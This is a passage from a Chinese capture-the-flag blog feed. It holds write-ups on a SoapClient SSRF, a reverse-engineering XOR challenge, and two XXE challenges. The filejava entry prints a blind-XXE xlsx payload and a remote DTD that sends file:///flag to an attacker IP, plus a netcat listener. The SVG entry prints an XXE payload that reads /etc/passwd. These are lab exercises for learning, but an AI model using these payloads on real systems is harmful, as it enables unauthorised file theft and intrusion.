$a);</code>变成<code>call_user_func($a);</code>而<code>$a</code>为一个数组且第一个值就是我们传入的SoapClient作为类，而第二个值welcome_to_the_lctf2018为方法，很显然该类中没这个方法从而调用<code>SoapClient的__call函数发送请求、借此执行ssrf</code>。</p><p>第三步，最后就是已我们设置的cookie(即<code>Cookie:PHPSESSID=fvck</code>)去访问了，它会返回<code>$_SESSION</code>而此时我们的flag已经在里面了。</p><blockquote><p>怕突然来不及好好地爱你。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> ssrf </tag>
            
            <tag> php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF之Reverse</title>
      <link href="/2020/11/13/BUUCTF%E4%B9%8BReverse/"/>
      <url>/2020/11/13/BUUCTF%E4%B9%8BReverse/</url>
      
        <content type="html"><![CDATA[<p><strong>最近学了点汇编语言程序，拿这个练练手吧</strong></p><h2 id="1-helloword"><a href="#1-helloword" class="headerlink" title="1.helloword"></a>1.helloword</h2><p>这个下载下来是apk安卓应用，直接拿androidkiller分析一下，拿到flag。<br><img src="/2020/11/13/BUUCTF%E4%B9%8BReverse//1.png"><br><code>flag&#123;7631a988259a00816deda84afb29430a&#125;</code></p><h2 id="2-xor"><a href="#2-xor" class="headerlink" title="2.xor"></a>2.xor</h2><p>这里直接用ida64打开，我一般先不查32或64，直接打开，遇到错误后再看，这次很幸运。然后选中<code>_main函数</code>点击<code>F5</code>查看反汇编，内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rsi@1</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax@8</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [sp+2Ch] [bp-124h]@2</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">264</span>]; <span class="comment">// [sp+40h] [bp-110h]@1</span></span><br><span class="line">  __int64 v8; <span class="comment">// [sp+148h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v8 = *(_QWORD *)__stack_chk_guard_ptr;</span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  v3 = (<span class="type">char</span> *)<span class="number">256</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag:\n&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  get_line(v7, <span class="number">256LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v7) != <span class="number">33</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">33</span>; ++i )</span><br><span class="line">    v7[i] ^= v7[i - <span class="number">1</span>];</span><br><span class="line">  v3 = global;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v7, global, <span class="number">0x21</span>uLL) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Success&quot;</span>, v3);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_13:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed&quot;</span>, v3);</span><br><span class="line">  v4 = *(_QWORD *)__stack_chk_guard_ptr;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)__stack_chk_guard_ptr == v8 )</span><br><span class="line">    LODWORD(v4) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这里主要看字符数组v7，下面的这句很重要，可以看出v7有33位，并且加密过程为本位与前位的内容异或生成本位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(v7) != <span class="number">33</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">33</span>; ++i )</span><br><span class="line">    v7[i] ^= v7[i - <span class="number">1</span>];</span><br><span class="line">  v3 = global;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v7, global, <span class="number">0x21</span>uLL) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Success&quot;</span>, v3);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_13:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed&quot;</span>, v3);</span><br></pre></td></tr></table></figure><p>提取global字符串的数据<br><img src="/2020/11/13/BUUCTF%E4%B9%8BReverse//3.png"><br>解flag脚本，这里提供两个，第一个为直接复制的global，所以得转换一下数据类型；第二个为提取的十六进制，直接就可以转换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">str1 = [<span class="string">&#x27;f&#x27;</span>, <span class="number">0x0A</span>, <span class="string">&#x27;k&#x27;</span>, <span class="number">0x0C</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">0x11</span>, <span class="string">&#x27;x&#x27;</span>, <span class="number">0x0D</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="number">0x11</span>, <span class="string">&#x27;p&#x27;</span>, <span class="number">0x19</span>, <span class="string">&#x27;F&#x27;</span>, <span class="number">0x1F</span>, <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="number">0x0E</span>, <span class="string">&#x27;g&#x27;</span>, <span class="number">6</span>, <span class="string">&#x27;h&#x27;</span>, <span class="number">0x0F</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;O&#x27;</span>]</span><br><span class="line"></span><br><span class="line">x = <span class="string">&#x27;f&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isinstance</span>(str1[i], <span class="built_in">str</span>)):                          <span class="comment">#这里的这些判断是为了判断上面的list里的是否为数字。其中0X0A与6类似的为数字，带&#x27;&#x27;的为str。</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isinstance</span>(str1[i - <span class="number">1</span>], <span class="built_in">str</span>)):</span><br><span class="line">            x += <span class="built_in">chr</span>(<span class="built_in">ord</span>(str1[i]) ^ <span class="built_in">ord</span>(str1[i - <span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += <span class="built_in">chr</span>(<span class="built_in">ord</span>(str1[i]) ^ str1[i - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x += <span class="built_in">chr</span>(str1[i] ^ <span class="built_in">ord</span>(str1[i - <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a0x0 = [</span><br><span class="line">  <span class="number">102</span>,  <span class="number">10</span>, <span class="number">107</span>,  <span class="number">12</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">79</span>,  <span class="number">46</span>,  <span class="number">64</span>,  <span class="number">17</span>, </span><br><span class="line">  <span class="number">120</span>,  <span class="number">13</span>,  <span class="number">90</span>,  <span class="number">59</span>,  <span class="number">85</span>,  <span class="number">17</span>, <span class="number">112</span>,  <span class="number">25</span>,  <span class="number">70</span>,  <span class="number">31</span>, </span><br><span class="line">  <span class="number">118</span>,  <span class="number">34</span>,  <span class="number">77</span>,  <span class="number">35</span>,  <span class="number">68</span>,  <span class="number">14</span>, <span class="number">103</span>,   <span class="number">6</span>, <span class="number">104</span>,  <span class="number">15</span>, </span><br><span class="line">  <span class="number">71</span>,  <span class="number">50</span>,  <span class="number">79</span></span><br><span class="line">]   <span class="comment">#保留前三十三个字符的ascii</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">chr</span>(a0x0[<span class="number">0</span>])    <span class="comment">#第一位不进行异或</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(a0x0)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(a0x0[i] ^ a0x0[i-<span class="number">1</span>])    <span class="comment">#逐位异或</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="/2020/11/13/BUUCTF%E4%B9%8BReverse//2.png"></p><p><strong>capture the flag</strong><br><code>flag&#123;QianQiuWanDai_YiTongJiangHu&#125;</code></p><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯_2020_青龙组_web部分</title>
      <link href="/2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86/"/>
      <url>/2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1-filejava"><a href="#1-filejava" class="headerlink" title="1.filejava"></a>1.filejava</h1><p><strong>Tag:web-xml文件泄露，blind xxe，java反汇编，未解</strong></p><p>打开界面首先出现的就是一个可以上传文件的界面，我上传了一张图片，然后出现了一个上传成功的样式，并且可以将上传的图片下载下来，bp抓一下包。<br><img src="/2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86//1.png" alt="可以下载"><br>首先用bp的repeater模块没有发现啥东西<br><img src="/2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86//2.png" alt="没啥东西"><br>然后将参数改为<code>filename=../</code>测试一下目录穿越，结果报错了，也爆出了<code>web.xml</code>文件的绝对路径，下面看图<br><img src="/2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86//3.png" alt="爆出web-inf"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">异常报告&lt;/p&gt;&lt;p&gt;&lt;b&gt;消息&lt;/b&gt; &amp;#47;usr&amp;#47;local&amp;#47;tomcat&amp;#47;webapps&amp;#47;ROOT&amp;#47;WEB-INF&amp;#47;upload&amp;#47;15&amp;#47;6&amp;#47;.. (Is a directory)</span><br></pre></td></tr></table></figure><p>用<a href="https://c.runoob.com/front-end/691">菜鸟工具</a>解一下unicode编码后为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">异常报告消息 /usr/local/tomcat/webapps/ROOT/WEB-INF/upload/15/6/.. (Is a directory)</span><br></pre></td></tr></table></figure><p>然后尝试下载<code>web.xml</code>文件如下<br><img src="/2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86//4.png"></p><p>下面是几个.class文件的相对路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/cn/abc/servlet/ListFileServlet.class</span><br><span class="line">/cn/abc/servlet/UploadServlet.class</span><br><span class="line">/cn/abc/servlet/DownloadServlet.class</span><br></pre></td></tr></table></figure><p>直接把这几个文件下载下来。<br>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://ff202493-3329-4158-951d-39b0a82943b9.node3.buuoj.cn/DownloadServlet?filename=../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/ListFileServlet.class</span><br><span class="line"></span><br><span class="line">http://ff202493-3329-4158-951d-39b0a82943b9.node3.buuoj.cn/DownloadServlet?filename=../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/UploadServlet.class</span><br><span class="line"></span><br><span class="line">http://ff202493-3329-4158-951d-39b0a82943b9.node3.buuoj.cn/DownloadServlet?filename=../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</span><br></pre></td></tr></table></figure><p><code>cn.abc.servlet.UploadServlet</code>文件好像有点问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">savePath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">tempPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/temp&quot;</span>);</span><br><span class="line">    <span class="type">File</span> <span class="variable">tempFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(tempPath);</span><br><span class="line">    <span class="keyword">if</span> (!tempFile.exists())</span><br><span class="line">      tempFile.mkdir(); </span><br><span class="line">    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">DiskFileItemFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DiskFileItemFactory</span>();</span><br><span class="line">      factory.setSizeThreshold(<span class="number">102400</span>);</span><br><span class="line">      factory.setRepository(tempFile);</span><br><span class="line">      <span class="type">ServletFileUpload</span> <span class="variable">upload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletFileUpload</span>((FileItemFactory)factory);</span><br><span class="line">      upload.setHeaderEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">      upload.setFileSizeMax(<span class="number">1048576L</span>);</span><br><span class="line">      upload.setSizeMax(<span class="number">10485760L</span>);</span><br><span class="line">      <span class="keyword">if</span> (!ServletFileUpload.isMultipartContent(request))</span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">      List&lt;FileItem&gt; list = upload.parseRequest(request);</span><br><span class="line">      <span class="keyword">for</span> (FileItem fileItem : list) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> fileItem.getFieldName();</span><br><span class="line">          <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> fileItem.getString(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> fileItem.getName();</span><br><span class="line">        <span class="keyword">if</span> (filename == <span class="literal">null</span> || filename.trim().equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">          <span class="keyword">continue</span>; </span><br><span class="line">        <span class="type">String</span> <span class="variable">fileExtName</span> <span class="operator">=</span> filename.substring(filename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> fileItem.getInputStream();</span><br><span class="line">        <span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName))</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Workbook</span> <span class="variable">wb1</span> <span class="operator">=</span> WorkbookFactory.create(in);</span><br><span class="line">            <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">            System.out.println(sheet.getFirstRowNum());</span><br><span class="line">          &#125; <span class="keyword">catch</span> (InvalidFormatException e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">          &#125;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">saveFilename</span> <span class="operator">=</span> makeFileName(filename);</span><br><span class="line">        request.setAttribute(<span class="string">&quot;saveFilename&quot;</span>, saveFilename);</span><br><span class="line">        request.setAttribute(<span class="string">&quot;filename&quot;</span>, filename);</span><br><span class="line">        <span class="type">String</span> <span class="variable">realSavePath</span> <span class="operator">=</span> makePath(saveFilename, savePath);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(realSavePath + <span class="string">&quot;/&quot;</span> + saveFilename);</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">          out.write(buffer, <span class="number">0</span>, len); </span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line">        message = <span class="string">&quot;文件上传成功&quot;</span>;</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileUploadException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    request.setAttribute(<span class="string">&quot;message&quot;</span>, message);</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/ListFileServlet&quot;</span>).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里有个<code>excel</code>单词，涉及了下面的<a href="https://www.jianshu.com/p/73cd11d83c30">CVE-2014-3529</a>没有对xxe进行防护。</p><p><strong>漏洞利用</strong></p><p><strong>受害端文件构造</strong></p><p>首先新建文件<code>excel-</code>开头的文件，这里我的文件名为<code>excel-1.xlsx</code><br><img src="/2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86//5.png"></p><blockquote><p><del>这里因为听说buu的靶机都可以访问外网了，所以这里直接可以拿我的服务器做一下测试。</del>屁勒，不能，还是开个主机吧，<code>172.16.167.234</code>是靶机的内网ip<code>ifconfig</code></p></blockquote><p>然后把后缀名改为.zip后，改文件<code>[Content_Types].xml</code>的内容，向其中从第二行添加内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://172.16.168.38/file.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>改后将文件名重新再次命名为<code>excel-1.xlsx</code></p><p><strong>攻击端文件构造</strong></p><p>然后在攻击机的<code>/var/www/html/</code>下面新建<code>file.dtd</code>文件，内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://172.16.168.38:1111?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>反弹shell</strong></p><p>然后在攻击机端执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1111</span><br></pre></td></tr></table></figure><p>对反弹的流量进行监听</p><p><strong>flag</strong><br>然后上传<code>excel-1.xlsx</code>文件，在攻击机端接收到<code>flag</code></p><p><strong>按理说应该也可以的，但是没成功监听。。。好家伙，白忙活了，有时间再回来重做⑧</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BSidesCF-2019-web部分</title>
      <link href="/2020/11/12/BSidesCF-2019/"/>
      <url>/2020/11/12/BSidesCF-2019/</url>
      
        <content type="html"><![CDATA[<blockquote><p><font color="blue" size="1">我也想说对不起，可不知该从何谈起。</font></p></blockquote><blockquote><p>也是一个怀揣梦想的少年</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=1377372171&auto=1&height=66"></iframe><p><em><strong>从这次开始按比赛刷题</strong></em></p><h1 id="1-Pick-Tac-Toe"><a href="#1-Pick-Tac-Toe" class="headerlink" title="1.Pick Tac Toe"></a>1.Pick Tac Toe</h1><p><strong>标签:hackbar</strong></p><p>人机对战，这个很简单，hackbar实现三点连线获得游戏胜利的同时就也能获得flag了。发现能覆盖机器人的棋子位置，直接可以把所有的机器人的位置覆盖，当然这里我们只需要三点连线应该就行了。<br><img src="/2020/11/12/BSidesCF-2019//1.png"><br>直接获得flag。<br><code>flag&#123;5d693414-b66f-4cd4-a83e-096b92a2b2e7&#125;</code></p><h1 id="2-SVGMagic"><a href="#2-SVGMagic" class="headerlink" title="2.SVGMagic"></a>2.SVGMagic</h1><p><strong>标签:文件上传，xxe，svg</strong></p><p><a href="https://tiaonmmn.github.io/2020/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-SVGMagic/">参考题解</a></p><blockquote><p>svg实际上是一种xml文档，所以这里应该可以xxe<br><img src="/2020/11/12/BSidesCF-2019//0.png"><br>又根据svg的<code>&lt;text&gt;</code>标签可以成功执行xxe。<br><img src="/2020/11/12/BSidesCF-2019//2.png"><br><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/text">svg之text标签</a></p></blockquote><h2 id="0x01-payload"><a href="#0x01-payload" class="headerlink" title="0x01.payload"></a>0x01.payload</h2><p>用下面的payload，上传文件内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;512px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;190px&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 512 190&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">preserveAspectRatio</span>=<span class="string">&quot;xMidYMid&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">g</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的是我们的xxe的payload，下面是名为<code>m4xlmum.svg</code>的文件的内容。</p><p><strong>重点：不知道flag在哪里</strong><br>自己试了半天也没事出来，看看大师傅的知道了<code>flag.txt</code>文件在程序根目录下，就是<code>file:///proc/self/cwd/flag.txt</code>,</p><blockquote><p><font color="red" size="18">记录一下，当前进程的根目录即为`/proc/self/cwd/`</font></p></blockquote><p>最终payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span 